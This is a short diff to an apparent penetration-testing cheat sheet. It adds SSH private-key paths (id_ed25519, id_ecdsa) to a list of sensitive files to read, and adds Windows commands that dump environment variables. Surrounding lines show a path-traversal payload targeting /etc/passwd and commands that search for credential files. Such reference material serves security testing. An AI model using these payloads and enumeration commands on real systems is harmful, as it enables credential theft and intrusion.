@@ -1637,6 +1637,10 @@ Accept: ../../../../.././../../../../etc/passwd{%00{{
 ~/.ssh/id_dsa.pub
 ~/.ssh/id_rsa
 ~/.ssh/id_rsa.pub
+~/.ssh/id_ed25519
+~/.ssh/id_ed25519.pub
+~/.ssh/id_ecdsa
+~/.ssh/id_ecdsa.pub
 ~/.ssh/identity
 ~/.ssh/identity.pub
 ~/.viminfo
@@ -3869,6 +3873,13 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 accesschk.exe -uws "Everyone" "C:\Program Files\"
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+```
+
+##### List env variables
+```c
+set
+dir env:
+Get-ChildItem Env: | ft Key,Value
 ```
 
 ##### Search for files
